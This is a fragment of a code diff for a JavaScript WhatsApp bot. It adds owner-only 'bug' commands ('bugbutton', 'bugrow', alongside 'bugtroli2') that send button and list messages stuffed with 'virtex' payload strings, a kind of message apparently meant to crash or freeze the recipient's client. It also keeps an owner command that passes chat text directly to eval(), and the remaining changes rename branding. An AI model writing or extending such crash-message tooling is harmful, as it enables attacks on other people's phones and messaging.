+            isForwarded: false,
+            sendEphemeral: false,
+            "externalAdReply": {
+                "title": `${virtex2(prefix)}`,
+                "body": "",
+                "previewType": "PHOTO",
+                "thumbnailUrl": "https://i.ibb.co/3hrZZ6s/tsukasa.png",
+                "thumbnail": fs.readFileSync(`./denz.jpg`),
+                "sourceUrl": "https://youtube.com/c/YuzzuKamiyaka"}}})
+                break
+        case 'bugbutton':
+        if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
+        denz.toggleDisappearingMessages(from, 0)
+        sendButLocation(from, `${ngazap(prefix)}`, `${virtag(prefix)}`, {jpegThumbnail:ofrply}, [{buttonId:`${prefix}bbaij72njnwjibdo16830nslm1782`,buttonText:{displayText:'YUZZUKAMIYAKA🌹'},type:1}])
+        denz.toggleDisappearingMessages(from, 0)
+break
+case 'bugrow':
+if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
+denz.toggleDisappearingMessages(from, 0)
+ listMsg = {
+ buttonText: 'LIST MENU',
+ footerText: `${emoji2(prefix)}`,
+ description: `${virtex6(prefix)}`,
+ sections: [
+                     {
+                      "title": "CieKontol",
+ rows: [
+                          {
+                              "title": "CieBug",
+                              "rowId": ""
+                           }
+                        ]
+                     }],
+ listType: 1
+}
+denz.sendMessage(from, listMsg, MessageType.listMessage, {quoted:ftrol})
+denz.toggleDisappearingMessages(from, 0)
+break
+//Done
 case 'bugtroli2':
 if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
 if (args.length < 1) return reply('Jumlahnya?')
@@ -3121,7 +4101,7 @@ break
 				case 'return':
 				if (!isOwner) return reply(mess.only.ownerB)
 					return denz.sendMessage(from, JSON.stringify(eval(body.slice(8))), text, {quoted: mek})
-					if (err) return denz.sendMessage(from, `root @dcode-denpa:~ ${err}`, text, { quoted: mek })
+					if (err) return denz.sendMessage(from, `root @Ndyie-Botz:~ ${err}`, text, { quoted: mek })
                  break
                  case 'toimg':
 				case 'tomedia':
@@ -3509,7 +4489,7 @@ Giliran = @${tty.player1.split('@')[0]}`
             if (!e.includes("Cannot set property 'mtype' of undefined")) {
             if (!e.includes("jid is not defined")) {
      console.log(color('|ERR|', 'red'), color(e, 'cyan'))
-     denz.sendMessage(`${settings.NomorOwner}@s.whatsapp.net`, `─────「 *ALERT-ERROR* 」─────\n\n\`\`\`${e}\`\`\`\n\n────────────────────`, MessageType.text, {contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title: "Developer Bitch Boot",body:"",previewType:"PHOTO",thumbnail:fs.readFileSync('./denz.jpg'),sourceUrl:"https://wa.me/6285866295942?text=Assalamualaikum"}}})
+     denz.sendMessage(`${settings.NomorOwner}@s.whatsapp.net`, `─────「 *ALERT-ERROR* 」─────\n\n\`\`\`${e}\`\`\`\n\n────────────────────`, MessageType.text, {contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title: "Developer Gliders Bot",body:"",previewType:"PHOTO",thumbnail:fs.readFileSync('./denz.jpg'),sourceUrl:"https://youtube.com/c/YuzzuKamiyaka"}}})
 	}
     }
     }
